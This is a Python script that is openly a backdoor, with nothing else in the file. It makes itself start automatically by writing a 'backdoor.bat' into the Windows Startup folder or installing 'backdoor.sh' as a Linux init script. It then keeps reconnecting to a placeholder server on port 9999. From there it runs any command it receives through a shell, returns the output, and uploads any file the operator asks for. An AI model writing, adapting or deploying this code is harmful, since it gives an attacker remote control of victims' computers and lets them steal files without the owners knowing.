import socket
import subprocess
import os
import sys
import platform

def add_to_startup():
    if platform.system() == "Windows":
        import getpass
        USER_NAME = getpass.getuser()
        file_path = os.path.realpath(sys.argv[0])
        bat_path = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat"
        with open(bat_path, "w+") as bat_file:
            bat_file.write(f"start {file_path}\nexit")

    elif platform.system() == "Linux":
        file_path = os.path.realpath(sys.argv[0])
        with open(f"/etc/init.d/backdoor.sh", "w+") as script_file:
            script_file.write(f"#!/bin/sh\n{file_path}")
        os.chmod("/etc/init.d/backdoor.sh", 0o755)
        subprocess.call(["update-rc.d", "backdoor.sh", "defaults"])

def connect_to_server(host, port):
    while True:
        try:
            s = socket.socket()
            s.connect((host, port))
            while True:
                command = s.recv(1024).decode('utf-8')

                if 'terminate' in command:
                    s.close()
                    break
                elif 'grab' in command:
                    grab, path = command.split('*')
                    if os.path.exists(path):
                        with open(path, 'rb') as file:
                            s.send(file.read())
                else:
                    CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    s.send(CMD.stdout.read())
                    s.send(CMD.stderr.read())
        except Exception as e:
            print(e)
            continue

add_to_startup()
connect_to_server('your.server.ip', 9999)
